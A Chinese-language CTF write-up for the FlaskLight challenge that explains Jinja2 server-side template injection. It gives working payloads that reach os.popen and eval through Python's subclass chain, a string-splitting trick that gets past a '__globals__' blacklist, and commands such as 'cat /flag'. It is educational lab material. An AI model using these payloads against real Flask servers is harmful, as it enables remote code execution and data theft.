---
title: '[CSCCTF 2019 Qual]FlaskLight 1'
categories:
  - 
tags: []
abbrlink: 88a7bef9
date: 2026-02-02 13:28:39
---
# [CSCCTF 2019 Qual]FlaskLight

# 1

## 方法一：利用工具

![image-20260202125709483](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260202125709483.png)

1.首先确定有flask模板

![image-20260202115324870](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260202115324870.png)





2.fengji一键梭哈

![image-20260202125500176](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260202125500176.png)



![image-20260202125614442](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260202125614442.png)





## 2.方法二



### 知识点

------

### 1. 什么是模板？

**模板**（这里是 Python 的 **Jinja2** 模板）就像一个“填空题”。

后端代码可能长这样：

Python

```
# 正常情况：把名字填进大括号
template = "<h1>Hello, {% raw %}{{ name }}{% endraw %}!</h1>"
return render_template_string(template, name=user_input)
```

如果用户输入 `Gemini`，页面显示 `Hello, Gemini!`。

但如果你输入 `{% raw %}{{ 7*7 }}{% endraw %}`，页面会显示 `49`。这就说明：**服务器把你的输入当成代码执行了。**

------

### 2. Payload 拆解：

这道题最常用的 Payload 类似这样：

```
{% raw %}{{[].__class__.__base__.__subclasses__()[某数字].__init__.__globals__['os'].popen('ls').read()}}{% endraw %}
```

| **步骤**      | **代码片段**            | **它的作用（人话解释）**                                     |
| ------------- | ----------------------- | ------------------------------------------------------------ |
| **1. 出发点** | `[]` 或 `""`            | 找一个 Python 里的**对象**（比如一个空列表或空字符串）。     |
| **2. 查户口** | `.__class__`            | 问这个对象：你是什么类型的？（它会回：我是 `list` 类）。     |
| **3. 找祖宗** | `.__base__`             | 问这个类：你的父类（基类）是谁？（通常指向 `object`，万物之源）。 |
| **4. 找亲戚** | `.__subclasses__()`     | 问 `object`：你所有的子类有哪些？（这会返回几百个 Python 内部的类）。 |
| **5. 找间谍** | `[某数字]`              | 从那几百个类里，找一个**能执行系统命令**的类（比如 `site._Printer` 或 `warnings.catch_warnings`）。 |
| **6. 搜身**   | `.__init__.__globals__` | 进入这个类的内部，看看它引用了哪些全局变量（这就像翻它的口袋）。 |
| **7. 掏枪**   | `['os']`                | 在它的口袋里找到 `os` 模块，这个模块拥有操作系统的权限（操作系统接口（Operating System Interface））。 |
| **8. 开火**   | `.popen('ls').read()`   | 调用 `os` 执行 `ls` 命令，并把结果读出来显示在网页上。       |

**1. 数字是如何产生的？**

在 Python 中，所有类都继承自 `object`。

当你执行 `.__subclasses__()` 时，Python 会返回一个 **列表 (List)**，其中包含了当前运行环境下所有已经加载并继承自该基类的类。

- **为什么需要数字？** 因为 `.__subclasses__()` 返回的是一个列表，而列表只能通过 **索引（Index）** 来访问。
- **如何确定数字？** 不同的 Python 环境（如 Python 2.7 vs 3.8）加载的内置库数量不同。题目环境下
  - 索引 `59` 指向了 `warnings.catch_warnings` 类。
  - 索引 `71` 指向了 `site._Printer` 类。

---

### 3. [CSCCTF 2019 Qual]FlaskLight 实战逻辑

这道题通常在 `/search` 路径下存在注入点。

1. **测试注入**：输入 `?search={% raw %}{{7*7}}{% endraw %}`，如果页面回显 `49`，确认 SSTI 存在。
2. **寻找利用链**：因为不同环境的数字（索引）不一样，你需要写个脚本或手动去试，直到找到包含 `os` 模块的类。
3. **获取 Flag**：
   - 先看文件：`{% raw %}{{...popen('ls').read()}}{% endraw %}`（发现里面有个 `flasklight` 文件夹）。
   - 读取 Flag：`{% raw %}{{...popen('cat /flag').read()}}{% endraw %}`。

------

### 💡 给你的建议（超越任务）

这种“套娃”式的 Payload 不需要背。在 CTF 中，你可以用工具快速定位：

- **自动化工具**：`tplmap`（就像 SQL 注入里的 sqlmap）。
- **自研练习**：既然你在学自研，你可以写一个简单的 Python 脚本，用 `for` 循环遍历 `__subclasses__()`，自动找出哪一个索引下面含有 `'os'` 字符串。

Python

```
# 一个简单的自研探测逻辑片段
search_index = 0
for cls in [].__class__.__base__.__subclasses__():
    if 'os' in cls.__init__.__globals__:
        print(f"找到啦！索引是：{search_index}")
    search_index += 1
```







### 步骤

1.

注入但发现直接写 `__globals__` 会报 500 错误，说明**黑名单过滤**。



可用'__glo' + 'bals__'代替

Jinja2 模板支持字符串运算，`'a' + 'b'` 会在执行时被拼接成 `'ab'`

此题提示flask，Flask 默认绑定的模板引擎就是 **Jinja2**



2.

利用第 59 号 (`catch_warnings`) + `eval`

```
__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls /').read()")
```

```
{% raw %}{{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls /').read()")}}{% endraw %}
```

**`[].__class__.__base__`**：获取 `object` 基类。

**`.__subclasses__()[59]`**：定位到 `warnings.catch_warnings` 类。

**`.__init__`**：获取该类的初始化函数（构造函数）。

**`['__globals__']`**：通过函数对象获取其所属的 **全局命名空间（字典类型）**。

**`['__builtins__']`**：在全局空间中查找 Python 的 **内置模块** 字典。

**`['eval']`**：获取内置的 `eval()` 函数。

**`eval("...")`**：执行括号内的 Python 代码字符串。

- `__import__('os')`：动态加载 OS 模块。
- `.popen('ls')`：执行 shell 命令并开启管道。
- `.read()`：读取执行结果。



or



利用第 71 号 (`site._Printer`) 直接用 `os`

```
.__init__['__glo'+'bals__']['os'].popen('ls /').read()
```

```
{% raw %}{{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls /').read()}}{% endraw %}
```

1. **`[71]`**：定位到 `site._Printer` 类。
2. **`.__init__['__globals__']`**：同样进入全局命名空间。
3. **`['os']`**：**关键区别点**。`site._Printer` 这个类在定义时，其所在的模块已经 `import os` 了。因此，它的全局变量字典里直接就存有 `os` 模块的引用。
4. **`.popen().read()`**：直接调用，不需要经过 `eval` 转换。





3.接下来就像方法一一样改命令寻找flag即可